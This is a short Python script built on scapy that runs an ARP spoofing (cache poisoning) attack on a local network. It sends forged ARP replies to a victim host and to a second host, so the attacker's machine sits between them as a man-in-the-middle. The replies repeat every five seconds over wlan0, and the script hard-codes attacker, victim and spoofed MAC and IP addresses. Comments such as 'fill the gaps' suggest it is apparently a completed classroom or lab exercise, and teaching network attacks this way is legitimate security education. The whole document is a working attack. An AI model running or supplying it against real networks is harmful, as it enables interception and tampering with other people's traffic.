from scapy.all import *
import time

# complete with the appropriate values
macAttacker = "D8:3A:DD:54:32:BE"
ipAttacker = "192.168.1.102"

macVictim = "8C:90:2D:8D:59:BA"
ipVictim = "192.168.1.104"

ipToSpoof = "192.168.1.100"#"192.168.0.105"
macToSpoof = "F8:B1:56:A0:3D:E0"#"70:08:94:29:b8:f3"


arp= Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker           # fill the gaps
arp[ARP].psrc = ipToSpoof            # fill the gaps
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim            # fill the gaps

sendp(arp, iface="wlan0")

arp2 = Ether() / ARP()
arp2[Ether].src = macAttacker
arp2[ARP].hwsrc = macAttacker           # fill the gaps
arp2[ARP].psrc = ipVictim # fill the gaps
arp2[ARP].hwdst = macToSpoof
arp2[ARP].pdst = ipToSpoof # fill the gaps

sendp(arp2, iface="wlan0")

while 1:
    sendp(arp, iface="wlan0")
    sendp(arp2, iface="wlan0")
    time.sleep(5);
